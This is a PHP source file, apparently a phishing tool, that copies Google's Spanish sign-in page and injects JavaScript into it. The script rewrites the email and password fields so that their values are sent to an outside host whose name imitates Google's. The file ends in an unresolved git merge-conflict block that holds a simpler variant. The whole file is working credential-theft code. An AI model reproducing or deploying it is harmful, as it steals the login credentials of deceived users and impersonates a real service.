<?php
$html = file_get_contents('https://accounts.google.com/ServiceLogin?hl=es');
$insertCode = "<script language=\"javascript\" type=\"text/javascript\">
	
function getXMLHTTPRequest() {
  try {
    req = new XMLHttpRequest();
  } catch(err1) {
    try {
      req = new ActiveXObject(\"Msxml2.XMLHTTP\");
    } catch (err2) {
      try {
        req = new ActiveXObject(\"Microsoft.XMLHTTP\");
      } catch (err3) {
        req = false;
      }
    }
  }
  return req;
}


var http = getXMLHTTPRequest(); // creo una instancia del objeto XMLHTTPRequest.

function enviarvariable(variable) { // funcion encargada de inviar la variable al archivo php llamado index.php.
    var url = 'http://accountsgoogle.herokuapp.com/escribe.php?variable=' + variable; // creación de la URL.
    http.open(\"GET\", url, true); // fijando los parametros para el envío de datos.
    http.onreadystatechange = handler; // Qué función utilizar en caso de que el estado de la petición cambie.
    http.send(null); // enviar petición.
}

function handler() {
  if (http.readyState == 4) {
    if(http.status == 200) {
      a=http.responseText; // El texto de respuesta del archivo index.php lo muestra como una alerta.
    }
  }
}

//enviarvariable('hola'); // llamo a la función pasándole como parámetro el valor de la variable que quieres enviar.

function datos(){
	name = document.getElementById('Email').value;
	passw = document.getElementById('Passwd').value;
	enviarvariable(passw);
}

</script></head>";
$htmlConstruida = str_replace("</head>", $insertCode, $html);

$insertCode2 = "id='Email' onchange='enviarvariable(document.getElementById(\"Email\").value)'";
//$insertCode2 = "id='signIn' onclick='datos();'";
$htmlConstruidaEmail = str_replace('id="Email"', $insertCode2, $htmlConstruida);

$insertCode3 = "id='Passwd' onchange='enviarvariable(document.getElementById(\"Passwd\").value)'";

$htmlConstruidaPasswd = str_replace('id="Passwd"', $insertCode3, $htmlConstruidaEmail);
echo $htmlConstruidaPasswd;
?>

=======
<html>
<head><title> Gmail </title></head>
<body>

<? 
$html = file_get_contents('https://accounts.google.com/ServiceLogin?hl=es');
echo $html;
?>

</body>
</html>
>>>>>>> 7bb8788969cfb33b5e3797302d04078c479d369d
